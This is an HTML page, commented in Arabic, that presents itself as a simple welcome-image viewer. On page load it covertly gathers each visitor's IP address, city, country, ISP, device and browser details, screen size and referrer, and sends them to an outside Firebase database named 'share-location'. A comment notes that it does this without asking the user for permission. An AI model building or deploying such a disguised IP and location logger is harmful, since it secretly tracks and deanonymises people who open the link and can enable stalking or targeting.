<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة عرض الصورة والتحليلات</title>
    <!-- مكتبات Firebase للاتصال بقاعدة البيانات -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body {
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f4f1ea;
        }
        img {
            max-width: 100%;
            max-height: 85vh;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <!-- عرض الصورة المرفوعة -->
    <img src="image.JPG" alt="صورة ترحيبية">

    <script>
        // إعدادات رابط قاعدة بيانات Firebase الخاصة بك
        const firebaseConfig = {
            databaseURL: "https://share-location-d9ce6-default-rtdb.firebaseio.com"
        };
        
        // تهيئة اتصال Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // دالة جمع البيانات التقنية للزائر تلقائياً وتسجيلها
        async function logVisit() {
            let ipInfo = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipInfo = await response.json();
            } catch (e) {
                ipInfo = { error: "تعذر جلب معلومات الشبكة" };
            }

            const visitData = {
                timestamp: new Date().toLocaleString('ar-EG'),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceAndBrowser: navigator.userAgent,
                language: navigator.language,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || "دخول مباشر",
                ipAddress: ipInfo.ip || "غير متوفر",
                city: ipInfo.city || "غير متوفر",
                country: ipInfo.country_name || "غير متوفر",
                isp: ipInfo.org || "غير متوفر"
            };

            // إرسال البيانات فوراً إلى قاعدة البيانات تحت قسم test_visits
            db.ref('test_visits').push(visitData)
              .then(() => console.log("تم حفظ بيانات الزيارة في Firebase بنجاح"))
              .catch((err) => console.error("حدث خطأ أثناء الحفظ:", err));
        }

        // تنفيذ الكود فور فتح الصفحة بدون إزعاج المستخدم بإذونات
        window.onload = logVisit;
    </script>
</body>
</html>
